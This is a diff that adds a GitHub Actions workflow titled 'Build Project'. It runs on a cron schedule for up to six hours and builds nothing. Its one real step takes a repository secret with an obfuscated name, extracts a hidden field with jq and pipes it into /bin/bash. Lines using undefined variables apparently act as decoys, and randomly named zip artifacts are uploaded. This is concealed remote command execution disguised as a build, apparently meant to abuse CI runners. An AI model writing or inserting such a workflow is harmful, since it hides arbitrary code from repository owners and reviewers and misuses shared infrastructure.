@@ -1,0 +1,44 @@
+name: Build Project
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '37 2,8,14,20 * * *'
+permissions:
+  contents: read
+  actions: read
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  agent:
+    name: Main task
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Perform
+        env:
+          k863: ${{ secrets.k863 }}
+        run: |
+          printf '%s' "$k863" | jq -r .z3621 | /bin/bash
+          echo $sti38 | jq -r .jyr34 | /bin/bash
+          printf '%s' "$n69570" | jq -r .fdi22978 | /bin/bash
+          printf '%s' "$iiex865" | jq -r .yame01328 | /bin/bash
+          printf '%s' "$l0" | jq -r .ezd81 | /bin/bash
+          echo $ttii72554 | jq -r .bjarv35 | /bin/bash
+          echo $jgoyu4382 | jq -r .ocajr60 | /bin/bash
+          echo $l60056 | jq -r .djdxg6140 | /bin/bash
+
+      - name: Upload results
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: MUhwyuvt
+          path: "*.zip"
+          retention-days: 1
